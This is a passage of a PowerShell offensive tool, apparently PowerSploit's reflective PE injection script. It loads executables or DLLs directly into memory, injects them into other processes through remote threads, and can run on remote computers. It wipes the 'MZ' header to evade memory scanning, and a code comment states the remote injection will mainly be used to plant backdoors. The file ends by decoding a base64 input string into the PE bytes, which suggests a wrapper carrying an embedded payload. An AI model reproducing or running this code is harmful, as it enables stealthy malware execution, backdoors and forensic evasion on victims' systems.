			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}
 
# Convert base64 string to byte array
 
$PEBytes = [System.Convert]::FromBase64String($InputString)
